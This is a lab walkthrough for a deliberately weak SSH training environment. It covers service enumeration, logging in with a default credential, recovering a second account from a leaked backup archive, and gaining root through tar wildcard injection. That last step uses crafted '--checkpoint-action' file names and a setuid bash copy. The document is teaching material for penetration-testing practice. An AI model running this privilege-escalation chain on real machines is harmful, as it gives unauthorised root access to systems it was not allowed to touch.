# SSH Weak Access Lab Walkthrough

## Goal

Gain shell access through a weak foothold, recover a second account, and escalate through the legacy report archive workflow.

## Expected path

1. Enumerate the service:

```bash
nmap -sV -p 2222 localhost
```

2. Test or brute-force the initial weak credential in the lab environment:

- `user / password`

3. After login as `user`, inspect local notes and archives:

- `/home/user/readme.txt`
- `/srv/backups/helpdesk-export.tgz`

4. Extract the archive and recover the analyst account:

```bash
cd /tmp
tar -xzf /srv/backups/helpdesk-export.tgz
cat vpn-reset.txt
```

5. Reconnect as `analyst` and enumerate privileged execution paths:

```bash
sudo -l
ls -la ~/reports
cat ~/notes.txt
```

6. Abuse the tar wildcard expansion in the root-owned backup script:

```bash
cd ~/reports
printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash\nchmod u+s /tmp/rootbash\n' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
sudo /usr/local/bin/backup_reports.sh
/tmp/rootbash -p
```

## Why it works

- the initial foothold is intentionally weak
- a world-readable legacy archive leaks a second account
- the root-owned tar wrapper expands attacker-controlled filenames from `~/reports`

## Learning outcome

- service enumeration
- account pivoting after initial access
- privilege escalation through unsafe wildcard handling
